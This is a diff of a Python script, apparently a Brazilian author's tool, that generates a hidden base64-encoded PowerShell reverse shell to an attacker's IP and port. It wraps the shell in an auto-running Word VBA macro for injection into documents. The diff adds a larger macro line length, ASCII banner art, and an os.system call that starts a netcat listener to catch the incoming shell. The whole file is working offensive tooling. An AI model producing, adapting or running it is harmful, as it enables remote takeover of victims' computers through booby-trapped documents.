@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 #
 # Autor: Ygor Bittencourt - https://www.linkedin.com/in/ygorbittencourt/
-# Versão: 2
+# Versão: 3
 # 2022
 #
 #Run with Netcat  #nc -nlvp PORTA
@@ -12,15 +12,17 @@
 
 import sys
 import base64
+import os
 
 class cores:
     C1 = '\033[92m' #VERDE
     C2 = '\033[93m' #AMARELO
     C3 = '\033[91m' #VERMELHO
+    C4 = '\033[94m' #AZUL
+    C5 = '\033[37m' #BRANCO
 
 def inicio():
     print("A sintaxe eh: python3 %s IP PORTA" % sys.argv[0])
-    print("Lembre de rodar o netcat para pegar o reverso: #nc -nlvp PORTA")
     exit()
     
 try:
@@ -35,7 +37,16 @@ SPLIT = "powershell -nop -w hidden -e " + base64.b64encode(PSPAYL.encode('utf16'
 
 #Gerando uma versao terminal em modo oculto
 print('')
-print(cores.C3 + '[+] BASE64 PowerShell Reverse Shell Generator [+]')
+print(cores.C3 + "    ....                  ..... .. ..     ......                 .                ....                                ")
+print(cores.C3 + '   / .. ).... .........  / ...// // /    / ..../   ...... ......(.)...  ....     / ../...  .....                      ')
+print(cores.C3 + '  / ..  / .. `/ .../ . \/ .. \/ // /.   / ../ | | / / .. `/ .../ / .. \/ .. \   / /./ .. \/ .../                      ')
+print(cores.C3 + ' / /./ / /./ (..  )  ../ /./ /..  ../  / /... | |/ / /./ (..  ) / /./ / / / /  / ../ /./ / /                          ')
+print(cores.C3 + '/...../\..,./..../\.../\..../  /./    /...../ |.../\..,./...././\...././ /./  /./  \...././                           ')
+print(cores.C3 + '    ....                          ..... ..         ....   ....                                   ..... ..         ....')
+print(cores.C3 + '   / .. \.... .      .....  ...../ ...// /.  ...  / / /  / .. \... .   .....  .............     / ...// /.  ...  / / /')
+print(cores.C3 + '  / /./ / .. \ | /| / / . \/ .../\.. \/ .. \/ . \/ / /  / /./ / . \ | / / . \/ .../ .../ . \    \.. \/ .. \/ . \/ / / ')
+print(cores.C3 + ' / ..../ /./ / |/ |/ /  ../ /   .../ / / / /  ../ / /  / ., ./  ../ |/ /  ../ /  (..  )  ../   .../ / / / /  ../ / /  ')
+print(cores.C3 + '/./    \..../|../|../\..././   /...././ /./\.../././  /./ |.|\.../|.../\..././  /..../\.../   /...././ /./\.../././   ')
 print('')
 print(cores.C1 + '[+] VERSÃO PARA TERMINAL EM MODO OCULTO [+]')
 print('')
@@ -43,12 +54,12 @@ print(SPLIT)
 print('')
 
 
-#Quantidade de Caracteres por linha
-n = 80 
+#Quantidade de Caracteres por linha (Lembre que scripts VBA só podem ter até 255 caracteres por linha, não passe de 240 nesse SET)
+n = 200
 
 #Gerando a macro bonitinha
 print(cores.C2 +'[+] VERSÃO EM MACRO PARA INJEÇÃO [+]')
-print('-------------------------Corta aqui-------------------------')
+print('-------------------------Corte aqui-------------------------')
 print('Sub AutoOpen()')
 print('MyMacro')
 print('End Sub')
@@ -67,4 +78,8 @@ for i in range(0, len(SPLIT), n):
 print('')
 print('CreateObject("Wscript.Shell").Run Str')
 print('End Sub')
+print('-------------------------Corte até aqui----------------------')
 print('') 
+print(cores.C4 +'[+] Iniciando escuta com o Netcat na porta %s [+]' % porta)
+print(cores.C5 +'')
+os.system('nc -nlvp %s' % porta)
